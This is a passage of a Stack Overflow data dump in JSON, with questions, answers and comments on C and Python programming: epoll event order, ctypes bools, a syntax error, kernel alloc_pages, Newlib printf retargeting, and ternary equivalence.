"open-source", "epoll"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1551846710, "post_id": 55014499, "comment_id": 96785243, "body": "Then your code will process the writes before the reads before the errors. The code will do exactly what you told it to do."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1551859489, "post_id": 55014499, "comment_id": 96790049, "body": "If there&#39;s a difference, one best starts with the most urgent/important task, possibly even having three separeate or a nested loops to complete all of the urgent work first. If there isn&#39;t \u2013 well, read/write is is somehow the natural order, or have you heard about a write/read failure or an OI error (I -&gt; input -&gt; reading, O analogously)? Might be due to the fact that most applications first get some input, process it and then produce some output from. And the error? &#39;<i>Ah, sure there was something, let&#39;s append it</i>&#39;. Error handling is surprisingly often neglected or even forgotten at all..."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551977223, "post_id": 55014499, "comment_id": 96847870, "body": "as long at the source of the conditions  <code>interestedevents</code> is not changed, it makes no difference in which order the conditions/events are handled"}], "owner": {"reputation": 1, "user_id": 11157201, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/w04Wj.png?s=128&g=1", "display_name": "lee3164", "link": "https://stackoverflow.com/users/11157201/lee3164"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 72, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1551839586, "creation_date": 1551838466, "last_edit_date": 1551839586, "question_id": 55014499, "link": "https://stackoverflow.com/questions/55014499/why-everyone-process-epoll-event-with-an-order-of-read-write-error", "title": "why everyone process epoll event with an order of read, write, error?", "body": "<p>I have read many open source code like nginx, redis, uwsgi\uff0cI find almost everyone process epoll event when epoll_wait return with an order read, write and error what What would happen if I process in any order\uff0csuch as write\uff0cread and error?\nthe most of process is below, I write it in pseudo code:</p>\n\n<pre><code>nfds = epoll_wait(epfd, interested_events, event_size, timeout);\nif (nfds &lt; 0) {\n   handle_error()\n}\n\nfor (i=0; i &lt; nfds; ++i) {\n    if (interested_events[i] &amp; READ_EVENT) process_read(interested_events[i]);\n    if (interested_events[i] &amp; WRITE_EVENT) process_write(interested_events[i]);\n    if (interested_events[i] &amp; ERROR_EVENT) process_(interested_events[i]);\n}\n</code></pre>\n"}, {"tags": ["python", "c", "ctypes"], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 11157109, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-G7PjPHGQctc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdYIz56Pkwa9dgNoOSNjlXlctjVrA/mo/photo.jpg?sz=128", "display_name": "EduMoga", "link": "https://stackoverflow.com/users/11157109/edumoga"}, "edited": false, "score": 0, "creation_date": 1551920925, "post_id": 55014214, "comment_id": 96821506, "body": "I tried this but the C code is not able to &quot;see&quot; the change that the Python code performed on the variable."}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "reply_to_user": {"reputation": 53, "user_id": 11157109, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-G7PjPHGQctc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdYIz56Pkwa9dgNoOSNjlXlctjVrA/mo/photo.jpg?sz=128", "display_name": "EduMoga", "link": "https://stackoverflow.com/users/11157109/edumoga"}, "edited": false, "score": 0, "creation_date": 1551921471, "post_id": 55014214, "comment_id": 96821630, "body": "@EduMoga: How is the C code declared? If it&#39;s not declaring the argument as a <code>volatile bool*</code> (perhaps some sort of atomic), the optimizer could easily be caching the value from memory to a register once and never rereading the memory (I&#39;m assuming threads are involved here, since otherwise the infinite loop in C would never return to Python, so Python would never get a chance to change the <code>bool</code>)."}, {"owner": {"reputation": 53, "user_id": 11157109, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-G7PjPHGQctc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdYIz56Pkwa9dgNoOSNjlXlctjVrA/mo/photo.jpg?sz=128", "display_name": "EduMoga", "link": "https://stackoverflow.com/users/11157109/edumoga"}, "edited": false, "score": 0, "creation_date": 1551988376, "post_id": 55014214, "comment_id": 96853446, "body": "Thank you, I fixed the issue using a multiprocessing.Value object to use the c_bool in order to be able to access it from C code and be able to see the change reflected. The original question did not include the multiprocess/multithread issue so I marked the answer as correct."}], "tags": [], "owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "is_accepted": true, "score": 3, "last_activity_date": 1551836637, "last_edit_date": 1551836637, "creation_date": 1551836392, "answer_id": 55014214, "question_id": 55014166, "link": "https://stackoverflow.com/questions/55014166/how-to-access-python-bool-variable-from-c-code/55014214#55014214", "title": "How to access python bool variable from C code?", "body": "<p>You can't pass a reference to an actual Python <code>bool</code>. But you could make a <code>ctypes.c_bool</code>, pass a pointer to it to your C code, and then have Python code assign it's <code>.value</code> attribute to change the value from C's point of view.</p>\n\n<pre><code>from ctypes import *\n\n# Flag initially false by default, can pass True to change initial value\ncflag = c_bool()  \n\n# Call your C level function, passing a pointer to c_bool's internal storage\nsome_c_func(byref(cflag))\n\n# ... other stuff ...\n\n# If C code dereferences the bool* it received, will now see it as true\ncflag.value = True  \n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 11157109, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-G7PjPHGQctc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdYIz56Pkwa9dgNoOSNjlXlctjVrA/mo/photo.jpg?sz=128", "display_name": "EduMoga", "link": "https://stackoverflow.com/users/11157109/edumoga"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 666, "favorite_count": 0, "accepted_answer_id": 55014214, "answer_count": 1, "score": 2, "last_activity_date": 1551836637, "creation_date": 1551835962, "last_edit_date": 1551836535, "question_id": 55014166, "link": "https://stackoverflow.com/questions/55014166/how-to-access-python-bool-variable-from-c-code", "title": "How to access python bool variable from C code?", "body": "<p>I have been working on extending a Python application using ctypes to call a shared library in C code. I have a boolean variable in Python which I would like to check periodically in an infinite loop in the C code to see if it changes. Is there a way to send the memory address of the python variable to the C function and access the content?</p>\n\n<p>Thank you in advance!</p>\n"}, {"tags": ["c", "syntax-error"], "comments": [{"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 4, "creation_date": 1551835523, "post_id": 55014089, "comment_id": 96782719, "body": "Please format the code so it&#39;s readable, and post the full error.\\"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 2, "creation_date": 1551835585, "post_id": 55014089, "comment_id": 96782733, "body": "The <code>(</code> in <code>(f =</code> looks suspicious though. I don&#39;t see that being closed."}, {"owner": {"reputation": 9358, "user_id": 35989, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/320239374ee6d1ae0d8c6889b0de89a9?s=128&d=identicon&r=PG", "display_name": "Dipstick", "link": "https://stackoverflow.com/users/35989/dipstick"}, "edited": false, "score": 1, "creation_date": 1552412060, "post_id": 55014089, "comment_id": 96996637, "body": "<code>(f = sqrt(pow(x, 3)-(2*x));</code> has 4 <code>(</code> but only 3 <code>)</code>. Also <code>if (1 &lt; x &lt; 5)</code> doesn&#39;t do what you want it to do. Try <code>if (1 &lt; x &amp;&amp; x &lt; 5)</code>."}, {"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1552433435, "post_id": 55014089, "comment_id": 97005868, "body": "You might want to look at coding styles; eg, <a href=\"https://www.kernel.org/doc/html/v4.11/process/coding-style.html\" rel=\"nofollow noreferrer\">kernel.org/doc/html/v4.11/process/coding-style.html</a> or any other that suits you. This probably would have helped with your error."}], "answers": [{"tags": [], "owner": {"reputation": 5360, "user_id": 9435815, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xaQWU.jpg?s=128&g=1", "display_name": "r3mus n0x", "link": "https://stackoverflow.com/users/9435815/r3mus-n0x"}, "is_accepted": false, "score": 2, "last_activity_date": 1552412589, "creation_date": 1552412589, "answer_id": 55127662, "question_id": 55014089, "link": "https://stackoverflow.com/questions/55014089/what-is-error-expected-before-token/55127662#55127662", "title": "What is error: expected &#39;)&#39; before &#39;;&#39; token|", "body": "<p>Clang to the rescue:</p>\n\n<pre><code>error: expected \u2018)\u2019 before \u2018;\u2019 token\n   (f = sqrt(pow(x, 3) - (2 * x));\n                                 ^\n</code></pre>\n\n<p>You are missing a closing <code>)</code>. By the way that pair of braces is not needed there at all:</p>\n\n<pre><code> if (x &gt; 1 &amp;&amp; x &lt; 5) // &lt;-- BTW, the corrected condition\n {\n     f = sqrt(pow(x, 3)-(2*x));\n     printf(\"%d\",f);\n }\n else\n { // &lt;-- better to use braces symmetrically in if-else\n    printf(\"Its not possible to do this function\");\n }\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11157054, "user_type": "registered", "profile_image": "https://graph.facebook.com/1510282945654109/picture?type=large", "display_name": "Uro\u0161 \u0110akovi\u0107", "link": "https://stackoverflow.com/users/11157054/uro%c5%a1-%c4%90akovi%c4%87"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1080, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1552412589, "creation_date": 1551835349, "last_edit_date": 1552411668, "question_id": 55014089, "link": "https://stackoverflow.com/questions/55014089/what-is-error-expected-before-token", "title": "What is error: expected &#39;)&#39; before &#39;;&#39; token|", "body": "<blockquote>\n  <p>I'm doing a small starter project for my school,and im kinda new to all the programing,now when i try to build my program it says that i need <strong>\")\" before \";\" in line 21</strong>\n  and its asking for <strong>\"\";\" before the \"}\" in line 22\"</strong> and i have checked and there is a \";\" before \"}\" but looks like my codeblocks is not recognizing it,or its just me being blind or me without a brain.\n  Thanks for looking at my question.</p>\n</blockquote>\n\n<p>actual error code</p>\n\n<blockquote>\n  <p>21|error: expected ')' before ';' token<br>\n  22|error: expected ';' before '}' token</p>\n</blockquote>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\nint main()\n\n{\n  int f,x;\n\n  printf(\"Type in values of x: \");\n\n  scanf(\"%d\",&amp;x);\n\n  if (x &lt;= 1)\n\n  {(f = -2 * x);\n      printf(\"%d\",f);}\n\n  else\n      printf(\"Its not possible to do this function\");\n\n\n if (1 &lt; x &lt; 5)\n\n {(f = sqrt(pow(x, 3)-(2*x));\n        printf(\"%d\",f);}\n\n else\n    printf(\"Its not possible to do this function\");\n\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux-kernel", "kernel", "linux-device-driver", "kernel-module"], "comments": [{"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1551871061, "post_id": 55014058, "comment_id": 96796906, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/32914298/print-value-and-address-of-pointer-defined-in-function\">Print value and address of pointer defined in function?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10644803, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d847a82d25af02362f1c28639fb1be14?s=128&d=identicon&r=PG&f=1", "display_name": "shaik", "link": "https://stackoverflow.com/users/10644803/shaik"}, "edited": false, "score": 0, "creation_date": 1551939976, "post_id": 55019535, "comment_id": 96826209, "body": "thanks for correction, but i am getting same value even after modification. Could you please check for you is it working?"}, {"owner": {"reputation": 729, "user_id": 11060870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a74dd465c0373f529ebe6f9ee7592add?s=128&d=identicon&r=PG", "display_name": "ccxxshow", "link": "https://stackoverflow.com/users/11060870/ccxxshow"}, "reply_to_user": {"reputation": 13, "user_id": 10644803, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d847a82d25af02362f1c28639fb1be14?s=128&d=identicon&r=PG&f=1", "display_name": "shaik", "link": "https://stackoverflow.com/users/10644803/shaik"}, "edited": false, "score": 0, "creation_date": 1551955037, "post_id": 55019535, "comment_id": 96834218, "body": "Can work, you use the module complete code(above) to try the results in your environment"}], "tags": [], "owner": {"reputation": 729, "user_id": 11060870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a74dd465c0373f529ebe6f9ee7592add?s=128&d=identicon&r=PG", "display_name": "ccxxshow", "link": "https://stackoverflow.com/users/11060870/ccxxshow"}, "is_accepted": true, "score": 0, "last_activity_date": 1551954820, "last_edit_date": 1551954820, "creation_date": 1551864150, "answer_id": 55019535, "question_id": 55014058, "link": "https://stackoverflow.com/questions/55014058/address-returned-by-alloc-pages-are-same-if-i-use-two-alloc-pages-for-checking/55019535#55019535", "title": "Address returned by alloc_pages are same if I use two alloc_pages for checking", "body": "<p>should print out the value of <code>page</code> directly, not the address of <code>page</code>.</p>\n\n<p>like below:</p>\n\n<pre><code>struct page *page;\npage = alloc_pages(GFP_KERNEL, 0);\npr_info(\"physical address GFP_KERNEL - %p\\n\", page);\n\npage = alloc_pages(GFP_HIGHUSER, 2);\npr_info(\"physical address of GFP_High - %p\\n\", page);\n</code></pre>\n\n<h3>Module full code:</h3>\n\n<pre><code>#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt;\n\nstruct page *page1;\nstruct page *page2;\n\nstatic int __init test_alloc_pages_init(void)\n{\n    struct page *page;\n    page = alloc_pages(GFP_KERNEL, 0);\n    pr_info(\"physical address GFP_KERNEL - %p\\n\", page);\n    page1 = page;\n\n    page = alloc_pages(GFP_HIGHUSER, 2);\n    pr_info(\"physical address of GFP_High - %p\\n\", page);\n    page2 = page;\n\n    return 0;\n}\n\nstatic void __exit test_alloc_pages_exit(void)\n{\n    if (page1) {\n        pr_info(\"free page1: %p\\n\", page1);\n        __free_pages(page1, 0);\n    }\n    if (page2) {\n        pr_info(\"free page2: %p\\n\", page2);\n        __free_pages(page2, 2);\n    }\n    return;\n}\n\nmodule_init(test_alloc_pages_init);\nmodule_exit(test_alloc_pages_exit);\n\nMODULE_LICENSE(\"GPL\");\n</code></pre>\n\n<p>dmesg info:</p>\n\n<pre><code>[117582.127432] physical address GFP_KERNEL - ffffea002e1cf2c0\n[117582.127434] physical address of GFP_High - ffffea002e0ec500\n[117584.214921] free page1: ffffea002e1cf2c0\n[117584.214922] free page2: ffffea002e0ec500\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 10644803, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d847a82d25af02362f1c28639fb1be14?s=128&d=identicon&r=PG&f=1", "display_name": "shaik", "link": "https://stackoverflow.com/users/10644803/shaik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 55019535, "answer_count": 1, "score": 1, "last_activity_date": 1551954820, "creation_date": 1551835087, "last_edit_date": 1551946053, "question_id": 55014058, "link": "https://stackoverflow.com/questions/55014058/address-returned-by-alloc-pages-are-same-if-i-use-two-alloc-pages-for-checking", "title": "Address returned by alloc_pages are same if I use two alloc_pages for checking", "body": "<p>I am trying to analyse <code>alloc_pages()</code> functionality.\nI know it returns the physical address of the first-page struct it is pointing to.\nI would like to confirm with the below code.</p>\n\n<pre><code>struct page *page;\npage = alloc_pages(GFP_KERNEL, 0);\npr_info(\"physical address GFP_KERNEL - %p\\n\", page); \npage = alloc_pages(GFP_HIGHUSER, 2);\npr_info(\"physical address of GFP_High - %p\\n\", page);\n</code></pre>\n\n<p>As you can see I used <code>alloc_pages()</code> twice, but I got the same address returned. Shouldn't I get a different address?</p>\n\n<p>I edited it from &amp;page -> page in pr_info function</p>\n"}, {"tags": ["c", "gcc", "embedded", "printf", "newlib"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551836640, "post_id": 55014043, "comment_id": 96782951, "body": "You can find implementations of <code>printf()</code> and its relatives of greater or lesser complexity on the web.  If you find <code>int printf(const char * restrict fmt, ...) { va_list args; va_start(args, fmt); int rc = vfprintf(stdout, fmt, args); va_end(args); return rc; }</code> then you&#39;ve got a relay function and you need to find the implementation of <code>vfprintf()</code> instead.  But that too is available\u2026"}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551875493, "post_id": 55014043, "comment_id": 96799554, "body": "@JonathanLeffler : Except if Newlib is used there is already a <code>printf()</code> implementation.  The question I think should be about how to <i>retarget</i> Newlib so that <i>its</i> <code>printf()</code> works rather then how to <i>implement</i> <code>printf</code>"}], "answers": [{"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 2, "last_activity_date": 1551875656, "last_edit_date": 1551875656, "creation_date": 1551875261, "answer_id": 55023127, "question_id": 55014043, "link": "https://stackoverflow.com/questions/55014043/how-do-you-implement-printf-in-gcc-from-newlib/55023127#55023127", "title": "How do you Implement printf in GCC from Newlib?", "body": "<p>In Newlib you don't implement <code>printf()</code> that is included in the library.  You simply implement a minimal set of syscalls to support the library.  The stream device sycalls API comprises of <code>open</code>, <code>close</code>, <code>read</code> and <code>write</code> (or reentrant versions with the <code>_r</code> suffix) - the reentrancy in this is useful if you are using multi-threading and need a per thread <code>errno</code> (amongst any implementation specific re-entrancy requirements).  </p>\n\n<p>If all you are implementing is <code>stdout</code> (the stream used by <code>printf()</code>, <code>putchar()</code>, <code>puts()</code> etc.) and are only supporting a single device (typically a UART) and are not concerned about the ability to redirect or reentrancy, then <code>open</code>, <code>close</code> and <code>read</code> can be empty, and <code>write</code> can simply output the provided buffer directly to your low-level serial I/O API:</p>\n\n<pre><code>int _write(int handle, char *data, int size ) \n{\n    int count ;\n\n    handle = handle ; // unused\n\n    for( count = 0; count &lt; size; count++) \n    {\n        outputByte( data[count] ) ;  // Your low-level output function here.\n    }\n\n    return count;\n}\n</code></pre>\n\n<p>Note that <code>handle</code> here is unused.  For <code>stdout</code> it will be 1 (<code>stdin</code> = 0 and <code>stderr</code> = 2).  The <code>handle</code> argument would be used if you wanted separate output devices for <code>stdout</code> and <code>stderr</code> or if you were supporting additional devices or a file system and <code>fopen</code> or <code>stdout</code> redirection.  It is used to identify a steam opened by <code>open</code>.  By ignoring it all stream output (such as <code>fprintf()</code> will be handled in the same way and output to the same device); in many cases (where <code>printf()</code> is just a means of getting debug output, or your application has no filesystem you won't care.</p>\n\n<p>Given that <code>write</code> function, <code>printf()</code> will \"just work\" (in the simplest possible manner) because under the hood all stdio output functions call <code>write</code>).  A low-level output function that is buffered and non-blocking (e.g. an interrupt driven UART driver) is advised.</p>\n\n<p>Obviously if you want to accept <em>input</em> on <code>stdin</code> too, you would implement a similar <code>read</code> function.</p>\n\n<p>If you want a heap (<code>malloc()</code> etc) you will also need to implement <code>sbrk</code> / <code>sbrk_r</code>.  I would suggest that you at least implement that if nothing else in Newlib syscalls.</p>\n\n<p>A more sophisticated treatment for syscalls implementation is discussed by Bill Gaitliff in <a href=\"https://www.cs.ccu.edu.tw/~pahsiung/courses/esd/resources/newlib.pdf\" rel=\"nofollow noreferrer\">Porting and Using Newlib in Embedded Systems</a>, while basic implementation is discussed at <a href=\"https://balau82.wordpress.com/2010/12/16/using-newlib-in-arm-bare-metal-programs/\" rel=\"nofollow noreferrer\">here</a> while example minimal implementation stubs similar to that above are provided in the <a href=\"https://sourceware.org/newlib/\" rel=\"nofollow noreferrer\">Newlib documentation</a> itself.</p>\n"}], "owner": {"reputation": 255, "user_id": 5071304, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/48fcec5627ec098ae422e6272e507a1b?s=128&d=identicon&r=PG&f=1", "display_name": "cDreamer", "link": "https://stackoverflow.com/users/5071304/cdreamer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2090, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1605032857, "creation_date": 1551834908, "last_edit_date": 1605032857, "question_id": 55014043, "link": "https://stackoverflow.com/questions/55014043/how-do-you-implement-printf-in-gcc-from-newlib", "title": "How do you Implement printf in GCC from Newlib?", "body": "<p>I'm struggling to properly implement printf from newlib into my esp32, using GCC.</p>\n<p>I've gone through the newlib documentation and it gives me general information about how printf is called, but doesn't explain the back end implementation to me.</p>\n<p>Based on my current research I have determined that printf outputs a formatted string to the STDOUT. On a PC this was simpler for me to understand because there's a console window that would display the formatted output from printf, however on an embedded system I understand that you have to tell the library where to redirect the formatted output of printf to and that's what I'm trying to figure out.</p>\n<p>Again, based off of my research I have come to understand that some functions are required to accomplish this, specifically the function <code>_write</code>.</p>\n<p>I'm finding it very difficult on how to bridge the gap between printf and utilizing the <code>_write</code> function. I'm hoping someone here can help me understand how to properly implement printf.</p>\n<p>And if I missed some documentation that clearly explains this, then please redirect me to that. I tried reading the newlib documentation, as well as GCC related documentation, but nothing really mentions how to use printf, but there is plenty of documentation on how to call printf and format the string, but that part is easy. I need to know how to get the formatted string from the STDOUT of the MCU.</p>\n<p>Thanks to all!</p>\n"}, {"tags": ["c", "if-statement"], "comments": [{"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 2, "creation_date": 1551834030, "post_id": 55013867, "comment_id": 96782416, "body": "Obfuscated C code mode enabled."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1551834945, "post_id": 55013867, "comment_id": 96782592, "body": "Both are far harder to read than: <code>int largest = x1; if (x2 &gt; largest) largest = x2; if (x3 &gt; largest) largest = x3; return largest;</code> (where the type <code>int</code> is assumed, but can be the (common?) scalar type of <code>x1</code>, <code>x2</code>, <code>x3</code> \u2014 a type for which <code>&gt;</code> is defined)."}], "answers": [{"comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551833935, "post_id": 55013891, "comment_id": 96782389, "body": "The question was about C, not C++."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1551833954, "post_id": 55013891, "comment_id": 96782393, "body": "Whoops, I thought I had my C++ search on :/  I have removed the C++ recommendation."}, {"owner": {"reputation": 65594, "user_id": 459640, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/bc790307b3c4cdbd25f582d9067651f1?s=128&d=identicon&r=PG", "display_name": "aschepler", "link": "https://stackoverflow.com/users/459640/aschepler"}, "edited": false, "score": 0, "creation_date": 1551834451, "post_id": 55013891, "comment_id": 96782501, "body": "If the types are arithmetic, the usual arithmetic conversions apply to ternary expressions. I can&#39;t think of any cases in C where <code>x1 &gt; x3</code> is valid but <code>(x1 &gt; x3) ? x1 : x3</code> is not."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551838026, "post_id": 55013891, "comment_id": 96783275, "body": "Disagree that &quot; statement 1 will result in a compilation error.&quot;  <a href=\"https://stackoverflow.com/a/55014093/2410359\">example</a>"}], "tags": [], "owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "is_accepted": false, "score": 3, "last_activity_date": 1551833972, "last_edit_date": 1551833972, "creation_date": 1551833790, "answer_id": 55013891, "question_id": 55013867, "link": "https://stackoverflow.com/questions/55013867/are-both-of-these-statements-equivalent/55013891#55013891", "title": "Are both of these statements equivalent?", "body": "<p>Yes, they are equivalent, provided the types of <code>x1</code>, <code>x2</code> and <code>x3</code> are all the same.  If types are different but convertible to the return type, then statement 1 will result in a compilation error.</p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1551834219, "creation_date": 1551834219, "answer_id": 55013949, "question_id": 55013867, "link": "https://stackoverflow.com/questions/55013867/are-both-of-these-statements-equivalent/55013949#55013949", "title": "Are both of these statements equivalent?", "body": "<p>Yes, they are equivalent.</p>\n\n<p>Starting with the inner <code>if</code>:</p>\n\n<pre><code>if(x1&gt;x3){\n    return x1;\n}\nelse{\n    return x3;\n}\n</code></pre>\n\n<p>This is the same as:</p>\n\n<pre><code>return (x1 &gt; x3) ? x1 : x3;\n</code></pre>\n\n<p>Let's call the above expression <code>X</code>:</p>\n\n<p>Now looking at the outer if / else if /else:</p>\n\n<pre><code>if(x1&gt;x2){\n    return X;\n}\nelse if(x2&gt;x3){\n    return x2;\n}\nelse return x3;\n</code></pre>\n\n<p>This becomes:</p>\n\n<pre><code>return (x1&gt;x2) ? X : ((x2&gt;x3) ? x2 : x3);\n</code></pre>\n\n<p>Substituting in <code>X</code>:</p>\n\n<pre><code>return (x1 &gt; x2) ? ((x1 &gt; x3)? x1 :x3) : ((x2 &gt; x3) ? x2 : x3);\n</code></pre>\n\n<p>This can be a bit more clear if you split this up over multiple lines:</p>\n\n<pre><code>return (x1 &gt; x2) ? ((x1 &gt; x3)? \n                       x1 :\n                       x3) : \n       (x2 &gt; x3) ? x2 : x3;\n</code></pre>\n\n<p>If the there were only one level of <code>if</code> statements I might go with the ternary operator, but because the levels are nested I would stick with the more explicit  set of statements for clarity.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 3, "last_activity_date": 1551836495, "last_edit_date": 1551836495, "creation_date": 1551835374, "answer_id": 55014093, "question_id": 55013867, "link": "https://stackoverflow.com/questions/55013867/are-both-of-these-statements-equivalent/55014093#55014093", "title": "Are both of these statements equivalent?", "body": "<blockquote>\n  